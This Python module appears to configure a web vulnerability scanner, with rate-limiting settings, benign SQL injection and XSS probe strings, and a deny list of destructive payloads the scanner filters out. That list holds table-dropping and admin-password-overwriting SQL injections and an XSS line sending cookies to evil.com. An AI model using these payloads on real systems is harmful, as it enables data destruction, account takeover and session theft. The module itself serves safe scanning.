import os
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field


@dataclass
class ScannerConfig:
    safe_mode: bool = True
    max_payloads_per_type: int = 10
    max_retries: int = 5
    timeout: int = 30
    min_delay: float = 1.0
    max_delay: float = 3.0
    verify_findings: bool = True
    respect_robots_txt: bool = True
    custom_user_agent: Optional[str] = None
    max_concurrent_requests: int = 3
    enable_logging: bool = True
    log_file: Optional[str] = None


class ScannerSettings:
    _instance: Optional['ScannerSettings'] = None
    _config: ScannerConfig = ScannerConfig()

    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    @classmethod
    def get_config(cls) -> ScannerConfig:
        return cls._config

    @classmethod
    def configure(cls, **kwargs):
        for key, value in kwargs.items():
            if hasattr(cls._config, key):
                setattr(cls._config, key, value)

    @classmethod
    def load_from_env(cls):
        cls.configure(
            safe_mode=os.environ.get('VULNCHECK_SAFE_MODE', 'true').lower() == 'true',
            max_payloads_per_type=int(os.environ.get('VULNCHECK_MAX_PAYLOADS', '10')),
            max_retries=int(os.environ.get('VULNCHECK_MAX_RETRIES', '5')),
            timeout=int(os.environ.get('VULNCHECK_TIMEOUT', '30')),
            min_delay=float(os.environ.get('VULNCHECK_MIN_DELAY', '1.0')),
            max_delay=float(os.environ.get('VULNCHECK_MAX_DELAY', '3.0')),
            verify_findings=os.environ.get('VULNCHECK_VERIFY', 'true').lower() == 'true',
            respect_robots_txt=os.environ.get('VULNCHECK_ROBOTS', 'true').lower() == 'true',
            custom_user_agent=os.environ.get('VULNCHECK_USER_AGENT'),
            max_concurrent_requests=int(os.environ.get('VULNCHECK_CONCURRENT', '3')),
            enable_logging=os.environ.get('VULNCHECK_LOGGING', 'true').lower() == 'true',
            log_file=os.environ.get('VULNCHECK_LOG_FILE'),
        )


SAFE_PAYLOADS = {
    'sql_injection': {
        'union_select': [
            "' UNION SELECT NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2,3--",
        ],
        'boolean_blind': [
            "' AND 1=1--",
            "' AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ],
        'time_based': [
            "'; WAITFOR DELAY '00:00:02'--",
            "'; SLEEP(2)--",
        ],
        'error_based': [
            "'",
            "'\"",
            "\\",
        ],
    },
    'xss': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
    ],
}


DESTRUCTIVE_PAYLOADS = {
    'sql_injection': [
        "'; DROP TABLE users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; DELETE FROM users--",
        "'; DROP DATABASE--",
    ],
    'xss': [
        "<script>document.location='http://evil.com/?c=" + "${document.cookie}" + "'</script>",
    ],
}


def is_safe_payload(vuln_type: str, payload: str) -> bool:
    if vuln_type in DESTRUCTIVE_PAYLOADS:
        return payload not in DESTRUCTIVE_PAYLOADS[vuln_type]
    return True


def get_safe_payloads(vuln_type: str) -> List[str]:
    return SAFE_PAYLOADS.get(vuln_type, [])
